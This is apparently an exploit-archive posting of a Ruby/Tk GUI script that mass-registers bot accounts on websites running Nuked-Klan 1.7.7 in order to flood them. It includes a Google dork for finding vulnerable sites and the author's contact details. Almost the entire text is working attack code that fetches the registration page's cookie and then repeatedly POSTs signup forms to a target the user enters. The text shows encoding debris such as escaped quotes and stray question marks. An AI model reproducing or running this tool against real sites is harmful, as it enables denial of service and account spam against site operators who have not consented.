Nuked-Klan 1.7.7 Mass Register & Denial Of Service
==================================================

# usr/bin/env Ruby
# Mass Register, Denial Of Service Attack On Nuked-Klan 1.7.7
# 23/04/10
# Code By, Whivack and thanks at "Gsk? | Callo" for help and "Gsk? | Alg3ri4n" for idea
# ActiveTcl 8.4 and Ruby 1.8.6
# V 2.0 GUI
# WebApps/0day
# Dork Google By Gsk? | Callo : "Powered by Nuked-Klan 1.7.7 ? 2002, 2008"
# Contact Me At : whivackandninpa@gmail.com
# Visit http://gsk2.org/

require &#039;net/http&#039;
require &#039;net/https&#039;
require &#039;tk&#039;

root = TkRoot.new {
? title "Code, By Whivack"
}
TkLabel.new( root ) {
text "Website :"
pack( {&#039;padx&#039; => 10, &#039;pady&#039; => 10} )
}
site = TkEntry.new( root ) {
pack( { "side" => "top" } )
}
TkLabel.new( root ) {
text "Number Register : < 100"
pack( {&#039;padx&#039; => 10, &#039;pady&#039; => 10} )
}
nbr = TkEntry.new( root ) {
pack( { "side" => "top" } )
}
TkLabel.new( root ) {
text "Bot Name :"
pack( {&#039;padx&#039; => 10, &#039;pady&#039; => 10} )
}
pseudo = TkEntry.new( root ) {
pack( { "side" => "top" } )
}
attack = TkButton.new( root ) {
? text "Send"
? pack( { "side" => "bottom" } )
}
TkLabel.new( root ) {
text "Code By Whivack, Thanks Gsk? | Alg3ri4n For Idea And Gsk? | Callo For Help"
pack( {&#039;padx&#039; => 10, &#039;pady&#039; => 10} )
}
var = 0
nombre = TkVariable.new
pseu = TkVariable.new
nbr.textvariable = nombre
pseudo.textvariable = pseu
cible = TkVariable.new
site.textvariable = cible
attack.bind( "1", proc {
while var < nombre
? var +=1
http = Net::HTTP.new("#{cible}", 80)
http.use_ssl = false
path = &#039;/index.php?file=User&op=reg&#039;
resp, data = http.get(path, nil)
cookie = resp.response[&#039;set-cookie&#039;]
pse = "#{pseu}" + "#{var}"
data = "pseudo=#{pse}&pass_reg=test&pass_conf=test&mail=#{pse}@gmail.fr&email=&country=France.gif&game=1"
headers = {
? &#039;Cookie&#039; => cookie,
? &#039;Referer&#039; => "http://#{cible}/index.php",
? &#039;Content-Type&#039; => &#039;application/x-www-form-urlencoded&#039;
}
resp, data = http.post(path, data, headers)
puts &#039;Code = &#039; + resp.code
puts &#039;Message = &#039; + resp.message
resp.each {|key, val| puts key + &#039; = &#039; + val}
puts data
end
}
)
Tk.mainloop



